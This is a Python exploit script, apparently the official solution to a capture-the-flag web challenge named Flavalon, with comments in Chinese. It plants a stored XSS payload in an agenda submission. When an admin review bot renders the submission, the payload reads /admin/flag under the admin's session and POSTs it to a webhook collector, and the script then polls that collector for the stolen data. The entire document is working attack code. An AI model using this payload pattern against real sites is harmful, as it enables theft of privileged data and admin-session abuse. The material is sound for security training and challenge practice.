#!/usr/bin/env python3
"""Flavalon —— 官方 exp（纯标准库）。

考点：存储型 XSS + 后台审核机器人
  1. 每日事项提交后由后台机器人登录管理员后台复核；
  2. 复核页把投稿正文当富文本渲染（sink）；
  3. 机器人访问时脚本以管理员身份执行，读取 /admin/flag 并外带到回连接收点。

用法：
  python3 solve.py http://127.0.0.1:8080
"""

import http.cookiejar
import json
import sys
import time
import urllib.request

TOKEN = "attacker-token"


def main(base: str) -> None:
    base = base.rstrip("/")
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # 以管理员身份读取 flag，并把它回连到收集点
    exfil = (
        "<img src=x onerror=\""
        "fetch('/admin/flag').then(r=>r.text()).then(t=>"
        f"fetch('/api/webhook/{TOKEN}',{{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({payload:t})}))\">"
    )

    body = json.dumps({"title": "team sync", "content": exfil}).encode()
    req = urllib.request.Request(
        base + "/api/agenda", data=body, headers={"Content-Type": "application/json"}
    )
    print("[*] 提交日程（含 XSS payload）…")
    op.open(req).read()

    print("[*] 等待审核机器人访问…")
    for _ in range(30):
        time.sleep(1)
        hits = json.loads(op.open(base + f"/api/webhook/{TOKEN}").read())
        if hits:
            print("[+] 收到外带数据：", hits[0]["payload"])
            return
    print("[-] 未收到回连，检查机器人是否启用（BOT_ENABLED=1）")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080")
